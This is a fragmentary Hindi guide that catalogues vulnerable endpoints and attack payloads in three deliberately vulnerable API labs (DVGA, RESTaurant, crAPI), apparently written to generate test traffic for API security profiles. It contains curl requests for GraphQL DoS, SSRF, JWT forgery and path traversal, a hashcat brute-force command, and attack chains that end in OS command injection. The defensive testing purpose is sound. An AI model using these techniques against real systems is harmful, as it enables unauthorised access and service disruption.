...
यह गाइड तीन API सुरक्षा परीक्षण एप्लिकेशन में प्रत्येक API एंडपॉइंट, जानबूझकर रखी गई भेद्यता, और अटैक पेलोड को कैटलॉग करता है। F5 XC API सुरक्षा प्रोफ़ाइल विकास के लिए ट्रैफ़िक जनरेशन पैटर्न बनाने हेतु इसका उपयोग करें।
...
Types:    PasteObject (id, title, content, public, owner, ipAddr, userAgent)
          OwnerObject (id, username, pastes)  ← परिपत्र संदर्भ
```
...
| `me(token)` | Query | नहीं | JWT द्वारा उपयोगकर्ता प्राप्त करें (जालसाज़ी संवेदनशील) |
| `systemHealth` | Query | नहीं | स्वास्थ्य जांच |
| `systemUpdate` | Query | नहीं | धीमी क्वेरी (~82 सेकंड, DoS वेक्टर) |
| `systemDiagnostics(cmd)` | Query | admin/password | अनुमत OS कमांड निष्पादित करें |
| `createPaste(title, content, public)` | Mutation | नहीं | पेस्ट बनाएँ (content के माध्यम से XSS) |
| `importPaste(host, port, path, scheme)` | Mutation | नहीं | दूरस्थ पेस्ट आयात करें (SSRF, कमांड इंजेक्शन) |
...
**गहरी पुनरावृत्ति (परिपत्र Owner/Paste संदर्भ):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
...
**एलियास-आधारित अटैक (1000 एलियास ऑपरेशन):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
...
**फील्ड सुझाव (टाइपो से मान्य फील्ड का पता चलता है):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{pastes{titl}}"}'
...
**importPaste के माध्यम से SSRF (आंतरिक सेवाओं की जांच):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
...
**JWT टोकन जालसाज़ी (बिना हस्ताक्षर वाले टोकन स्वीकार करता है):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
...
**uploadPaste के माध्यम से मनमाना फ़ाइल लेखन (पथ ट्रैवर्सल):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
...
| `/restaurant/token` | POST | नहीं | — | कमज़ोर सीक्रेट (97952) वाला JWT |
| `/restaurant/healthcheck` | GET | नहीं | — | स्वास्थ्य जांच |
...
#### API1:2023 — टूटा हुआ ऑब्जेक्ट स्तर प्राधिकरण (BOLA)

**दूसरे उपयोगकर्ता की प्रोफ़ाइल संशोधित करें:**
```bash
...
**अन्य उपयोगकर्ताओं के ऑर्डर तक पहुँचें (ऑफसेट एन्यूमरेट करें):**
```bash
...
**JWT कमज़ोर सीक्रेट ब्रूट-फोर्स (सीक्रेट 6 अंकों का है: 97952):**
```bash
# jwt.io पर टोकन डीकोड और जालसाज़ी करें
# सीक्रेट: 97952 (hashcat -a 3 -m 16500 token '?d?d?d?d?d?d' से ब्रूट-फोर्स योग्य)

# Chef टोकन जालसाज़ी करें:
# Header: {"alg":"HS256","typ":"JWT"}
# Payload: {"sub":"chef","exp":9999999999}
# सीक्रेट 97952 से हस्ताक्षर करें
```

#### API3:2023 — टूटा हुआ ऑब्जेक्ट प्रॉपर्टी स्तर प्राधिकरण (BOPLA)
...
#### API5:2023 — टूटा हुआ फंक्शन स्तर प्राधिकरण (BFLA)
...
#### API7:2023 — सर्वर-साइड अनुरोध जालसाज़ी (SSRF)

**मेनू image_url के माध्यम से आंतरिक एंडपॉइंट की जांच करें (Employee भूमिका आवश्यक):**
```bash
...
# 4. Chef-स्तर टोकन प्राप्त करने के लिए पुनः प्रमाणीकरण
TOKEN=$(curl -sf -X POST ${ORIGIN}/restaurant/token \
  -d "username=hacker&password=Hack123" | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")
...
**प्रमाणीकरण:** JWT Bearer टोकन (RS256, एल्गोरिथम कन्फ्यूज़न के प्रति संवेदनशील)
...
# 2. सत्यापन ईमेल के लिए MailHog जांचें
...
| `/identity/api/v2/vehicle/vehicles` | GET | हाँ | वाहन सूचीबद्ध करें (UUID लीक होते हैं) |
...
| `/identity/api/v2/admin/videos/{id}` | DELETE | हाँ | **BFLA** (कोई एडमिन जांच नहीं) |

#### कम्युनिटी सर्विस

| एंडपॉइंट | मेथड | प्रमाणीकरण | भेद्यता |
|---|---|---|---|
| `/community/api/v2/community/posts` | GET | हाँ | **डेटा एक्सपोज़र** (vehicle_id, email लीक) |
...
#### चुनौती 1 — BOLA: दूसरे उपयोगकर्ता के वाहन स्थान तक पहुँच
...
#### चुनौती 2 — BOLA: मैकेनिक रिपोर्ट तक पहुँच (कोई प्रमाणीकरण नहीं)
...
#### चुनौती 3 — टूटा हुआ प्रमाणीकरण: पासवर्ड रीसेट OTP ब्रूट-फोर्स
...
#### चुनौती 6 — DoS: कॉन्टैक्ट मैकेनिक के माध्यम से लेयर 7
...
#### चुनौती 7 — BFLA: एडमिन एंडपॉइंट के माध्यम से वीडियो हटाएँ
...
#### चुनौती 8 और 9 — सामूहिक असाइनमेंट: ऑर्डर हेरफेर के माध्यम से मुफ़्त आइटम
...
#### चुनौती 11 — कॉन्टैक्ट मैकेनिक के माध्यम से SSRF
...
#### चुनौती 14 — बिना प्रमाणीकरण ऑर्डर पहुँच
...
#### चुनौती 15 — JWT एल्गोरिथम कन्फ्यूज़न

```bash
# एल्गोरिथम "none" के साथ JWT जालसाज़ी (कोई हस्ताक्षर सत्यापन नहीं):
...
| **API2: टूटा हुआ प्रमाणीकरण** | JWT जालसाज़ी (`me` क्वेरी) | JWT कमज़ोर सीक्रेट (97952) | OTP ब्रूट-फोर्स (v2), JWT एल्गोरिथम कन्फ्यूज़न |
| **API3: BOPLA** | — | `PATCH /profile` (भूमिका वृद्धि) | वीडियो conversion_params, मैकेनिक ईमेल एक्सपोज़र |
| **API4: संसाधन खपत** | बैच, रिकर्शन, एलियास, फील्ड डुप्लिकेशन DoS | प्रतिक्रिया लंबाई के माध्यम से उपयोगकर्ता एन्यूमरेशन | `contact_mechanic` repeat_request DoS |
...
| **API9: अनुचित एसेट** | — | — | अप्रचलित `/auth/v2/check-otp` (कोई रेट लिमिट नहीं) |
| **API10: असुरक्षित खपत** | — | — | (SSRF के माध्यम से अप्रत्यक्ष) |
| **GraphQL-विशिष्ट** | इंट्रोस्पेक्शन, बैचिंग, रिकर्शन, एलियास, फील्ड डुप्लिकेशन, परिपत्र फ्रैगमेंट | — | — |
...
**BOLA परीक्षण:** क्रमिक ID एन्यूमरेट करें, अनुरोधों में उपयोगकर्ता पहचानकर्ता बदलें, स्वामित्व के बिना संसाधनों तक पहुँचें।
...
**प्रमाणीकरण बाईपास परीक्षण:** JWT टोकन जालसाज़ी, OTP ब्रूट-फोर्स, अप्रचलित API संस्करणों का उपयोग, एल्गोरिथम कन्फ्यूज़न।

**SSRF परीक्षण:** `importPaste`, `image_url`, और `mechanic_api` पैरामीटर में आंतरिक URL।

**DoS परीक्षण:** GraphQL बैच/रिकर्शन/एलियास अटैक, उच्च गणना के साथ `repeat_request_if_failed`।

### चरण 3: स्टेटफुल अटैक चेन

कुछ अटैक के लिए स्थिति सहित बहु-चरण अनुक्रम आवश्यक हैं:

1. **RESTaurant वृद्धि चेन:** पंजीकरण → टोकन → भूमिका को Chef तक PATCH → पुनः प्रमाणीकरण → कमांड इंजेक्शन
2. **crAPI पूर्ण प्रवाह:** साइनअप → ईमेल सत्यापन (MailHog) → लॉगिन → वाहन जोड़ें → कॉन्टैक्ट मैकेनिक (SSRF) → ऑर्डर हेरफेर
3. **DVGA रिकॉन-से-एक्सप्लॉइट:** इंट्रोस्पेक्शन → systemDiagnostics खोजें → एडमिन क्रेडेंशियल ब्रूट-फोर्स → OS कमांड निष्पादन
